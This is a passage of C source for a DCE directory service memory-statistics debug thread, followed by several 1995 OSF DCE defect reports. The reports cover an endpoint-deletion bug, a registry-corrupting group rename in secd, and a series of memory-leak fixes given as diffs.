struct memory_stat	mem_stat;
pthread_mutex_t		memstat_mutex;
pthread_cond_t		memstat_cond;

#endif /* if defined(DCE_CDS_DEBUG) */

int			memstat_interval = 120;

#if defined(DCE_CDS_DEBUG)

#define INIT_COUNTER(X) \
	{ \
		int looper; \
		mem_stat.X.total = 0; \
		for(looper = 0; looper < COUNTER_MAX; \
			mem_stat.X.allocd[looper] = 0, \
			looper++); \
		for(looper = 1; looper < COUNTER_MAX; \
			mem_stat.X.freed[looper] = 0, \
			looper++); \
		if(pthread_mutex_init(&mem_stat.X.mutex, \
			pthread_mutexattr_default)) \
		{ \
		      dce_svc_printf(CDS_S_PTHREADMUTEXINIT_MSG, (long)errno); \
                      error_exit(-1);		\
		} \
	}

#define PRINT_MEM_STAT(X, Y, Z, A) \
	{ \
		int	looper; \
		char	buf[2048]; \
		char	*cp = buf; \
		if(pthread_mutex_lock(&mem_stat.X.mutex)) \
		{ \
		      dce_svc_printf(CDS_S_PTHREADMUTEXLOCK_MSG, (long)errno);	\
                      error_exit(-1);		\
		} \
		sprintf(cp,"\n%s alloc %ld free %ld total %ld", \
			A, \
			mem_stat.X.allocd[0], \
			mem_stat.X.freed[0], \
			mem_stat.X.total); \
		cp += strlen(cp); \
		sprintf(cp, "\nALLOC,"); \
		cp += strlen(cp); \
		for(looper = 1; looper <= Y; \
			sprintf(cp, "%ld,", \
				mem_stat.X.allocd[looper]), \
				cp += strlen(cp), \
				looper++); \
		sprintf(cp, "\nFREE,"); \
		cp += strlen(cp); \
		for(looper = 1; looper <= Z; \
			sprintf(cp, "%ld,", \
				mem_stat.X.freed[looper]), \
				cp += strlen(cp), \
				looper++); \
		sprintf(cp, ""); \
		cp += strlen(cp); \
		DCE_SVC_DEBUG(( 	\
		    cds__svc_handle, 	\
		    cds_svc_gda, 	\
		    svc_c_debug7, 	\
		    "print_mem_stat : %s",	\
                    buf)); \
		if(pthread_mutex_unlock(&mem_stat.X.mutex)) \
		{ \
		      dce_svc_printf(CDS_S_PTHREADMUTEXUNLOCK_MSG, (long)errno);	\
                      error_exit(-1);		\
		} \
	}

static void
print_memstat(utc_t *utc_time)
{
    char	buf[128];


    DCE_SVC_DEBUG((
        cds__svc_handle,
        cds_svc_gda,
        svc_c_debug2,
	" >print_memstat"));

    strcpy(buf, "\nMEM_STAT struct ");
    if (0 <= utc_asclocaltime(&buf[17], sizeof(buf)-17, utc_time))
    {
	DCE_SVC_DEBUG((
            cds__svc_handle,
            cds_svc_gda,
            svc_c_debug5,
	    "print_memstat: %s",
	    buf));
    }
    
    PRINT_MEM_STAT(rr_el_t,8,7,"rr_el_t")
    PRINT_MEM_STAT(list_t,4,9,"list_t")
    PRINT_MEM_STAT(sendbuf,1,3,"sendbuf")
    PRINT_MEM_STAT(replicas_q,1,1,"replicas_q")
    PRINT_MEM_STAT(realloc_replicas_q,1,0,"realloc_replicas_q")
    PRINT_MEM_STAT(ss_cds_ReplicaPointer_t,1,0,"ss_cds_ReplicaPointer_t")
    PRINT_MEM_STAT(debug_el_t,1,1,"debug_el_t")
    PRINT_MEM_STAT(element_t,2,2,"element_t")
    PRINT_MEM_STAT(ss_cds_Set_t,1,0,"ss_cds_Set_t")
    PRINT_MEM_STAT(question_el_t,1,1,"question_el_t")
    PRINT_MEM_STAT(cds_FullName_t,1,1,"cds_FullName_t")

    DCE_SVC_DEBUG(( 
        cds__svc_handle, 
        cds_svc_gda, 
        svc_c_debug2,
	" <print_memstat"));
}


static void 
memstat (void)
{
      utc_t 	utc_time;
      int 	status;

      DCE_SVC_DEBUG((
          cds__svc_handle,
          cds_svc_gda,
          svc_c_debug2,
          " >memstat"));

	/*
	 * initialize the thread specific data 
	 */
	if(pthread_setspecific(thread_num, (pthread_addr_t)&memstat_th_num))
	{
	    dce_svc_printf(CDS_S_PTHREADSETSPECIFIC_MSG, (long)errno);
	    error_exit(-1);
	}

	if(pthread_mutex_lock(&memstat_mutex))
	{
	    dce_svc_printf(CDS_S_PTHREADMUTEXLOCK_MSG, (long)errno);
	    error_exit(-1);
	}

        status = utc_gettime(&utc_time);
        dce_assert(cds__svc_handle, (0 <= status));

	for(;;)
	{		
	        timespec_t time, inacc;
		long tdf;
		int temp;

		temp = utc_bintime(&time, &inacc, &tdf, &utc_time);
		dce_assert(cds__svc_handle,
			   (0 <= temp));
	        time.tv_sec += memstat_interval;

		if(pthread_cond_timedwait(&memstat_cond,
			&memstat_mutex, &time) && errno != EAGAIN)
		{
		    dce_svc_printf(CDS_S_PTHREADCONDTIMEDWAIT_MSG, (long)errno); 		
		    error_exit(-1);
		}


                status = utc_gettime(&utc_time);
		dce_assert(cds__svc_handle, (0 <= status));

                print_memstat(&utc_time);
	}
	
      DCE_SVC_DEBUG((
          cds__svc_handle,
          cds_svc_gda,
          svc_c_debug2,
          " <memstat"));
}

void
init_memstat (void)
{
	pthread_t	memstat_th;
	pthread_attr_t  pattr;


	DCE_SVC_DEBUG((
            cds__svc_handle,
            cds_svc_gda,
            svc_c_debug2,
            " >init_memstat"));

	INIT_COUNTER(rr_el_t)
	INIT_COUNTER(list_t)
	INIT_COUNTER(sendbuf)
	INIT_COUNTER(replicas_q)
	INIT_COUNTER(realloc_replicas_q)
	INIT_COUNTER(ss_cds_ReplicaPointer_t

CR Number                     : 12982
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : 'endpoint delete' deletes more than requested
Reported Date                 : 8/1/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 8/1/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/1/95 public]

 rpccp and dcecp in 1.1 remove all endpoints for an interface
 id when -i and -b options are specified. Customer identified
 problem was with rpccp. I verified that the same happens
 with dcecp endpoint commands. Here is the command line log
 that illustrates.
 
Script command is started on Tue Aug  1 17:19:26 EDT 1995.
# dcecp
dcecp> endpoint create -i c48c1194-cc3a-11ce-9a52-08005a4746ec,1.0 -b ncadg_ip_udp:130.105.1.182\[7777\]
dcecp> endpoint create -i c48c1194-cc3a-11ce-9a52-08005a4746ec,1.0 -b ncacn_ip_tcp:130.105.1.182\[7777\]
dcecp> endpoint show -i c48c1194-cc3a-11ce-9a52-08005a4746ec,1.0
{{interface {c48c1194-cc3a-11ce-9a52-08005a4746ec 1.0}}
 {binding {ncadg_ip_udp 130.105.1.182 7777}}}

{{interface {c48c1194-cc3a-11ce-9a52-08005a4746ec 1.0}}
 {binding {ncacn_ip_tcp 130.105.1.182 7777}}}
dcecp> endpoint delete -i c48c1194-cc3a-11ce-9a52-08005a4746ec,1.0 -b ncadg_ip_udp:130.105.1.182\[7777\]
dcecp> endpoint show -i c48c1194-cc3a-11ce-9a52-08005a4746ec,1.0
dcecp> exit
Script command is complete on Tue Aug  1 17:22:29 EDT 1995.

 CUSTOMER REPORT BELOW

From yas@tyrolia.yk.fujitsu.co.jp  Tue Jul 25 04:35:09 1995
Received: from postman.osf.org by osf.osf.org (5.65/OSF 1.0)
	id AA27810; Tue, 25 Jul 1995 04:35:09 -0400
Received: from fgwmail.fujitsu.co.jp (fgwmail.fujitsu.co.jp [164.71.1.133]) by postman.osf.org (8.6.9/8.6.x) with ESMTP
	id EAA26645 for <dce-defect@osf.org>; Tue, 25 Jul 1995 04:34:54 -0400
Received: from fdmmail.fujitsu.co.jp by fgwmail.fujitsu.co.jp (8.6.12+2.5Wb4/3.3W5-MX950612-Fujitsu Mail Gateway)
	id RAA17935; Tue, 25 Jul 1995 17:34:40 +0900
Received: from ace.yk.fujitsu.co.jp by fdmmail.fujitsu.co.jp (8.6.12+2.5Wb4/3.3W5-MX950612-Fujitsu Domain Mail Master)
	id RAA19224; Tue, 25 Jul 1995 17:34:09 +0900
Received: from tyrolia.yk.fujitsu.co.jp (tyrolia.yk.fujitsu.co.jp [133.162.42.77]) by ace.yk.fujitsu.co.jp (8.6.12+2.5Wb7/3.3W9-95030309) with SMTP id RAA13868; Tue, 25 Jul 1995 17:35:06 +0900
Received: by tyrolia.yk.fujitsu.co.jp (4.1/6.4J.5)
	id AA12024; Tue, 25 Jul 95 08:33:53 GMT
Message-Id: <9507250833.AA12024@tyrolia.yk.fujitsu.co.jp>
To: dce-defect@osf.org
Reply-To: yas@ace.yk.fujitsu.co.jp
Subject: rpccp remove mapping for well-known endpoint
Date: Tue, 25 Jul 1995 17:33:52 +0900
From: Yasushi Watanabe <yas@tyrolia.yk.fujitsu.co.jp>

Hello I'm Yasushi Watanabe a member of Fujitsu DCE porting group.

Now, I use DCE V1.0.3 and V1.1 running on Fujitsu WS based on SVR4.

I made a sample program using well-known endpoint.

After I started server, I used rpccp command as follows.
I tried both DCE 1.0.3 and DCE 1.1 .

1. rpccp show mapping [RET]
  ... 

  <object>         nil
  <interface id>   b489f960-c644-11ce-a426-00000e220501,1.0
  <string binding> ncacn_ip_tcp:133.162.42.77[4268]
  <annotation>     test server

  <object>         nil
  <interface id>   b489f960-c644-11ce-a426-00000e220501,1.0
  <string binding> ncadg_ip_udp:133.162.42.77[4268]
  <annotation>     test server

   ...

2. I tried rpccp remove mapping only udp.

   rpccp remove mapping -i b489f960-c644-11ce-a426-00000e220501,1.0
   -b ncadg_ip_udp:133.162.42.77[4268] [RET]

3. I executed rpccp show mapping again.
   I was surprised that both mapping information (for TCP and UDP) are
   removed. Why? Because of using well-known endpoint?
   I expected only information for ncacn_ip_tcp still printed.

Could you give me any reasons as soon as possible?
I would like to know whether this is bug , specification , or our porting miss.

I added my sample program.

Thanks and Regards!


----- test.idl -----
[
uuid(b489f960-c644-11ce-a426-00000e220501),
version(1.0),
endpoint("ncacn_ip_tcp:[4268]","ncadg_ip_udp:[4268]")
]
interface test
{
 void func([in,ref,string] char *str);
}
----------------------------------------------------------------

----- test.acf -----
interface test
{
        [explicit_handle] func();
}
----------------------------------------------------------------

----- client.c -----
#include<stdio.h>
#include<stdlib.h>
#include<sys/time.h>
#include<string.h>
#include"test.h"

main(argc,argv)
     int  argc;
     char *argv[];
{
  unsigned32           status;
  rpc_binding_handle_t binding_h;
  unsigned char        *str=(unsigned char *)"abc";

  rpc_binding_from_string_binding((unsigned_char_t *)argv[1], &binding_h, 
				  &status);
  func(binding_h, str);

}
---------------------------------------------------------------------------

----- server.c -----
#include<stdio.h>
#include"test.h"

#define IF_HANDLE test_v1_0_s_ifspec

main(argc,argv)
     int  argc;
     char *argv[];
{
  int                         i;
  unsigned32                  status;          
  rpc_binding_vector_t        *binding_vector; 
  char                        *annotation = "test server";
  
  rpc_server_use_all_protseqs_if(rpc_c_protseq_max_reqs_default, IF_HANDLE,
				 &status);

  rpc_server_inq_bindings(&binding_vector, &status);

  for (i = 0; i < binding_vector->count; i++)
    {
      unsigned_char_p_t sb;
      
      rpc_binding_to_string_binding(binding_vector->binding_h[i], &sb, &status);
      CHECK_STATUS(status, "rpc_binding_to_string_binding failed",ABORT);
      printf("Got binding: %s \n", sb);
      fflush(stdout);
      rpc_string_free(&sb, &status);
    }

  rpc_ep_register(IF_HANDLE, binding_vector, NULL, 
		  (unsigned_char_t *)annotation, &status);

  printf("Server Listen start... \n");
  rpc_server_listen(rpc_c_listen_max_calls_default, &status); 
}


void func(handle_t binding_h, unsigned char *str)
{
  printf("Server get %s from client\n",str);
  return;
}
------------------------------------------------------------------

----------------------------------------------------------------------------
  Fujitsu Limited              OPEN SOFTWARE DIVISION 5th DEVELOPMENT DEPT.
  Yasushi Watanabe             TEL:+81-45-474-1926  FAX:+81-45-473-3709
  NIFTY-Serve ID:HHA02574      E-mail:yas@ace.yk.fujitsu.co.jp
----------------------------------------------------------------------------



CR Number                     : 12978
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Renaming a polymorphic pgo/dir can corrupt registry
Reported Date                 : 7/27/95
Found in Baseline             : 1.1
Found Date                    : 7/27/95
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : sec
Sensitivity                   : public

[7/27/95 public]

Try the following in dcecp (see the warning that follows)

group create foo/bar
group create foo
group rename foo -to foo/xyz
group catalog

At this time, either secd will dump core and leaving a corrupted registry
which prevents a restart of secd, or the pgo/dir is gone.  Secd does not
detect the case of moving a pgo/dir aggregate as a descendent of itself.

[8/3/95 public]

If the intent of renaming a pgo/dir aggregate is to move the whole thing,
then here is a fix which solves the problem.

In rsdb_pgo_move(), make the following changes

RCS file: security/server/rsdb/RCS/rsdb_pgo.c,v
retrieving revision 12.3
retrieving revision 12.4
diff -c -r12.3 -r12.4

          rsdb_util_delete_dirs_if_empty(domain, new_parent_name, &tmp_st);
          SET_STATUS(status, sec_rgy_object_not_found);
          return;
+     }
+     /*
+      * Disallow moving a pgo/dir aggregate as a descendent of itself
+      */
+     if (RSDB_IS_DIR(&old_pgo) && RSDB_IS_PGO(&old_pgo)) {
+       if(rsdb_name_util_is_prefix(old_name, old_name_len, new_name,
+                                   new_name_len, &prefix_type)) {
+           if(prefix_type == rsdb_prefix) {
+               /* delete empty directories we may have created above. */
+               rsdb_util_delete_dirs_if_empty(domain,
+                                              new_parent_name, &tmp_st);
+               SET_STATUS(status, sec_rgy_dir_move_illegal);
+               return;
+           }
+       }
      }
      rsdb_util_change_name_key(domain, &old_pgo, new_parent_id,
                                name_key.name, name_key.name_len, status);

[12/19/95 public]
Fixed in DCE 1.2.1
Closed

[01/11/96 public]
The change merged from our local source was a simpler, more restrictive patch
made prior to the suggested diff.  Thus this gets reopened w/a lower priority.



CR Number                     : 12976
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : Memory leak in krb5_free_last_req()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/krb5/kdc/kdc_util.c,
security/krb5/lib/free/f_last_req.c, src/libdce/RIOS/syms.imp
Sensitivity                   : public

[7/25/95 public]

1) security/krb5/lib/free/f_last_req.c
* Revision 1.1.2.2  1992/12/29  14:27:54  zeliff

Check if the pointer is dinamically allocated or not. If yes, free it.

*** 61,66 ****
--- 61,68 ----
  #include <krb5/krb5.h>
  #include <krb5/ext-proto.h>
  
+ extern krb5_last_req_entry *nolrarray[];
+ 
  void
  krb5_free_last_req(val)
  krb5_last_req_entry **val;
***************
*** 67,74 ****
  {
      register krb5_last_req_entry **temp;
  
!     for (temp = val; *temp; temp++)
!       xfree(*temp);
!     xfree(val);
      return;
  }
--- 69,78 ----
  {
      register krb5_last_req_entry **temp;
  
!     if ( val != nolrarray ){
!       for (temp = val; *temp; temp++)
!               xfree(*temp);
!       xfree(val);
!     } 
      return;

  }
------------------------------------------------------------
2) security/krb5/kdc/kdc_util.c
* Revision /main/DCE1_1_WP/3  1995/04/25  20:19 UTC  jrr

In order to check the pointer, The constant pointer should be changed to public.

*** 689,695 ****
  /* This probably wants to be updated if you support last_req stuff */
  
  static krb5_last_req_entry nolrentry = { KRB5_LRQ_NONE, 0 };
! static krb5_last_req_entry *nolrarray[] = { &nolrentry, 0 };
  
  krb5_error_code
  fetch_last_req_info(dbentry, lrentry)
--- 689,695 ----
  /* This probably wants to be updated if you support last_req stuff */
  
  static krb5_last_req_entry nolrentry = { KRB5_LRQ_NONE, 0 };
! krb5_last_req_entry *nolrarray[] = { &nolrentry, 0 };
  
  krb5_error_code
  fetch_last_req_info(dbentry, lrentry)

------------------------------------------------------------
3) libdce/RIOS/syms.imp

*** 1,3 ****
--- 1,4 ----
  #!
  kutc_gettime
  kutc_adjtime
+ nolrarray

[07/28/95 public]
This OT CR was deleted by mistake.  Perhaps it was meant to be cancelled?



CR Number                     : 12975
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : rpc_mem_string memory leak( rca_setup_handle)
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/rca/internal_binding.c
Sensitivity                   : public

[7/25/95 public]
In rca_setup_handle(), context->site_name is reset without checking if
it points to the area that was already allocated.
***************************************************************
*** security/client/rca/internal_binding.c		    ***
*** Revision /main/DCE1_1_WP/2  1995/05/04  17:59 UTC  greg ***
***************************************************************
*** 1215,1220 ****
--- 1215,1222 ----
      else if (context->requested_site_name != NULL) 
      {
        SEC_DBG_GPRINTF(("(rca_setup_handle) No entry name -- status %x.  Fallin
g back to site == %s\n", st, context->requested_site_name));
+       if (context->site_name)
+           rpc_string_free(&context->site_name,&st);
        context->site_name = rpc_stralloc(context->requested_site_name);
      }    
      else if (context->cell_name != NULL)
***************
*** 1224,1229 ****
--- 1226,1233 ----
         * as the server name.
         */
        SEC_DBG_GPRINTF(("(rca_setup_handle) No entry name -- status %x.  Fallin
g back to site == cell\n", st));
+       if (context->site_name)
+           rpc_string_free(&context->site_name,&st);
        context->site_name = rpc_stralloc(context->cell_name);
      }



CR Number                     : 12973
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : Memory leak inconsistent malloc() and free()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/acl/dacl_pvt.h
Sensitivity                   : public

[7/25/95 public]
With current macro definition, memory is being allocated using RPC_MEM_ALLOC
routine which defaults to using memory pool alloc routine for AIX and
it is being freed using system free().

*******************************************************
*** security/client/acl/dacl_pvt.h	    	    ***	
*** Revision 1.1.60.1  1994/01/28  23:09:57  burati ***
*******************************************************
*** 86,92 ****
      rpc_ns_binding_inq_entry_name(handle,rpc_c_ns_syntax_dce,&tnameP,&xst);\
      if (GOOD_STATUS(&xst)) { \
          printf("%s imported binding from %s\n", txt, tnameP); \
!         free((char *)tnameP); \
      } \
  }
  #define SEC_OBJ_PRINTF(obj_uuid, txt) \
--- 86,92 ----
      rpc_ns_binding_inq_entry_name(handle,rpc_c_ns_syntax_dce,&tnameP,&xst);\
      if (GOOD_STATUS(&xst)) { \
          printf("%s imported binding from %s\n", txt, tnameP); \
!         rpc_string_free(&tnameP,&xst); \
      } \
  }
  #define SEC_OBJ_PRINTF(obj_uuid, txt) \
***************
*** 96,102 ****
      uuid_to_string(&obj_uuid, &touidP, &xst); \
      if (GOOD_STATUS(&xst)) { \
          printf("%s object uuid is %s\n", txt, touidP); \
!         free((char *)touidP); \
      } \
  }
  
--- 96,102 ----
      uuid_to_string(&obj_uuid, &touidP, &xst); \
      if (GOOD_STATUS(&xst)) { \
          printf("%s object uuid is %s\n", txt, touidP); \
!         rpc_string_free(&touidP,&xst); \
      } \
  }



CR Number                     : 12972
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : memory Leak in rs_setup_creator()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/server/rs/rs_reserved.c
Sensitivity                   : public

[7/25/95 public]

In rs_setup_creator(), memory for tmp_uuid_str is allocated via 
uuid_to_string(), but is never freed.
*******************************************************************
*** security/server/rs/rs_reserved.c 				***
*** Revision /main/DCE1_1_WP/1  1995/04/26  19:48 UTC  jrr 	***
*******************************************************************
*** 1549,1554 ****
--- 1549,1556 ----
              strncpy(pp->uuid, (char *)tmp_uuid_str, UUID_STR_LEN);
              pp->uuid[UUID_STR_LEN] = '\0';
              new_creator = false;
+             if (tmp_uuid_str != NULL)
+               rpc_string_free(&tmp_uuid_str, st);     
              return;
          }
      }
***************
*** 1567,1572 ****
--- 1569,1576 ----
      }
      strncpy(creator_uuid, (char *)tmp_uuid_str, UUID_STR_LEN);
      creator_uuid[UUID_STR_LEN] = '\0';
+     if (tmp_uuid_str != NULL)
+       rpc_string_free(&tmp_uuid_str, st);
      return;
  }



CR Number                     : 12971
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : memory leak in rs_rep_mgmt_delete()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/server/rs/rs_rep_mgmt.c
Sensitivity                   : public

[7/25/95 public]
Memory allocated using dce_cf_get_cell_name() for cell_name is never freed.
**************************************************************
*** security/server/rs/rs_rep_mgmt.c
*** Revision /main/DCE1_1_WP/1  1995/04/26  19:48 UTC  jrr ***
**************************************************************
*** 1584,1589 ****
--- 1584,1590 ----
      dce_cf_get_cell_name((char **) &cell_name, st);
      if (BAD_STATUS(st)) return;
      rs_ns_name_compose(cell_name, my_name, &full_name, st);
+     free(cell_name);
      if (BAD_STATUS(st)) return;
      rs_ns_server_delete_name(full_name, st);
      if (BAD_STATUS(st)) {



CR Number                     : 12970
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : memory leak in sec_login_validate_cert_auth()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/rca/sec_certify.c
Sensitivity                   : public

[7/25/95 public]
There is memory leakage in function sec_login_validate_cert_auth().
Memory allocated using dce_cf_prin_name_from_host() for variable
hostname is never freed after call to rpc_binding_set_auth_info().

***********************************************************
*** security/client/rca/sec_certify.c			***
*** Revision 1.1.6.1  1994/05/11  19:04:12  ahop	***
***********************************************************
diff output: < current version, > modified version
102a103,104
> 
>           free(hostname);

-----------------------------------------------------------

[7/25/95 public]
A context diff is much easier to read!
*** 98,107 ****
--- 98,108 ----
              rpc_binding_set_auth_info(cert_h, hostname,
                                  rpc_c_authn_level_pkt_integrity,
                                  rpc_c_authn_dce_private,
                                  (rpc_auth_identity_handle_t)login_context,
                                  rpc_c_authz_dce, st);
+               free(hostname);
          }
      }
  
      /* Call sec_clientd to validate certification authority */
      if (GOOD_STATUS(st)) {



CR Number                     : 12969
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : memory leak in sec_login_pvt_get_local_login_info()
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_np.c,
						security/client/login/RIOS/sec_login_np.c
Sensitivity                   : public
The first time that sec_login_pvt_get_local_login_info calls dce_cf_get_cell_name
it doesn't free my_cell, like it does the second time.
***********************************************************
*** src/security/client/login/RIOS/sec_login_np.c	***
*** Revision 1.1.4.2  1993/07/26  20:38:42  burati	***
***********************************************************
diff output: < current version, > modified version
190a191,192
> 
>                       free(my_cell);
***********************************************************
*** src/security/client/login/sec_login_np.c		***
*** Revision 1.1.5.2  1992/12/29  12:43:49  zeliff 	***
***********************************************************
diff output: < current version, > modified version
191a192,193
> 
>                       free(my_cell);

[7/25/95 public]

[7/25/95 public]
A context diff is much easier to read!
*************************************
security/client/login/sec_login_np.c
*************************************
*** 187,196 ****
--- 187,197 ----
                          && len < strlen(name)
                          && name[len] != '\0') {
                              /*  add 1 to get past '/' separator */
                              qname = name + len + 1;
                          }
+                       free(my_cell);
                      }
                  }
  
                  if (qname != NULL) {
                      pwd_data = GETPWNAM(qname);

*************************************
security/client/login/RIOS/sec_login_np.c
*************************************
*** 186,195 ****
--- 186,196 ----
                          && len < strlen(name)
                          && name[len] != '\0') {
                              /*  add 1 to get past '/' separator */
                              qname = name + len + 1;
                          }
+                       free(hostname);
                      }
                  }
  
                  if (qname != NULL) {
                      pwd_data = GETPWNAM(qname);



CR Number                     : 12968
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_rgy_site_close() leaks memory
Reported Date                 : 7/25/95
Found in Baseline             : 1.1wp
Found Date                    : 7/25/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/client/rca/internal_binding.c
Sensitivity                   : public

[7/25/95 public]

Function sec_rgy_site_close() in security/client/rca/internal_binding.c
is freeing memory incorrectly for several members of its rca_pvt_handle_blk_t
structure.  It should be using rpc_string_free() instead of free()
since the members where allocated using rpc_stralloc().  As a result
memory is being leaked and the rpc memory stats are incorrect.
The members which should be released using rpc_string_free() are:
site_name, cell_name, uncanon_princ_name, and requested_site_name.
***************************************************************
*** security/client/rca/internal_binding.c 		    ***
*** Revision /main/DCE1_1_WP/2  1995/05/04  17:59 UTC  greg ***
***************************************************************
diff output: < current version, > modified version
2496c2496
<                   free(context->site_name);
---
>                   rpc_string_free(context->site_name);
2499c2499
<                   free(context->cell_name);
---
>                   rpc_string_free(context->cell_name);
2502c2502
<                   free (context->uncanon_princ_name);
---
>                   rpc_string_free (context->uncanon_princ_name);
2508c2508
<                   free (context->requested_site_name);
---
>                   rpc_string_free(context->requested_site_name);

[7/25/95 public]
A context diff is much easier to read!
*************************************
security/client/rca/internal_binding.c
*************************************
*** 2493,2511 ****
                }
                    
                if (context->site_name != NULL)
!                   free(context->site_name);
  
                if (context->cell_name != NULL)
!                   free(context->cell_name);
  
                if (context->uncanon_princ_name != NULL)
!                   free (context->uncanon_princ_name);
                
                if (context->princ_name != NULL) 
                    free(context->princ_name);
                
                if (context->requested_site_name != NULL)
!                   free (context->requested_site_name);
                
                if (context->tower_vec != NULL)
                    TOWER_VEC_FREE(free, context->tower_vec);
--- 2493,2511 ----
                }
                    
                if (context->site_name != NULL)
!                   rpc_string_free(context->site_name);
  
                if (context->cell_name != NULL)
!                   rpc_string_free(context->cell_name);
  
                if (context->uncanon_princ_name != NULL)
!                   rpc_string_free(context->uncanon_princ_name);
                
                if (context->princ_name != NULL) 
                    free(context->princ_name);
                
                if (context->requested_site_name != NULL)
!                   rpc_string_free(context->requested_site_name);
                
                if (context->tower_vec != NULL)
                    TOWER_VEC_FREE(free, context->tower_vec);

[8/18/95 public]

You need to qualify the argument to rpc_string_free with the 
address operator, "&".  As in 

rpc_string_free(&context->cell_name)



CR Number                     : 12967
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gdsditadm
Short Description             : Mask7 does not allow input of
long 'Description" attribute
Reported Date                 : 7/23/95
Found in Baseline             : 1.1
Found Date                    : 7/23/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/23/95 public]


I report the ticket as received.   I have tried to find a way to input
a long 'Description' in Mask 7 to no avail.  In the documentaion there
is no mention of how this can be done either.  Yet, in appendix C the
'Description' attribute is specified to have an upper bound of 1024
characters.  The problem seem to affect all interactive tools that use
Mask 7 (tried with gdsditadm and gdssysadm).


Here is the ticket.

> 
> To: dce-defect@osf.org
> Cc: chen@ssaws.yk.fujitsu.co.jp
> Sender: yas@ace.yk.fujitsu.co.jp
> Date: Tue, 18 Jul 1995 21:31:54 +0900
> From: Chen Xiao Liang (CEC) <chen@ssaws.yk.fujitsu.co.jp>
> 
> I am Chen.
> 
> I have a question about how to input attribute value of "Description(DSC)"
> at
>  gdsditadm in the mask as below.
>  +----------------------------------------------------------------------------+
>  |  (Mask 7)             DIRECTORY SYSTEM               Add Attributes
>  |
>  +----------------------------------------------------------------------------+
>  |
>  |
>  |
>  |
>  |     Attributes:
>  |
>  |
>  |
>  |       Name :  Description
>  |
>  |       Value:  _____________________________________________
>  |
>  |               _____________________________________________
>  |
>  |
>  |
>  |       Name :  _________________________
>  |
>  |       Value:  _____________________________________________
>  |
